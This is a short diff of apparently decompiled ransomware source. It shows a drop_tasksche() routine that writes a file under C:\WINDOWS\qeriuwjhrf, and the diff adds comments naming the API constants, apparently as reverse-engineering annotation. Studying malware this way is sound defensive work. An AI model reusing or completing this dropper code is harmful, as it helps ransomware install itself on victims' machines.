@@ -76,8 +76,10 @@ int drop_tasksche()
     char szNewPath[MAX_PATH];
     sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
     sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
+    //MoveFileExA(szPath, szNewPath, REPLACE_EXISTING);
     MoveFileExA(szPath, szNewPath, 1);
     //GENERIC_WRITE is 0x40000000
+    //CreateFileA(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, SYSTEM, NULL);
     hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
     if(hFile != INVALID_HANDLE_VALUE)
     {
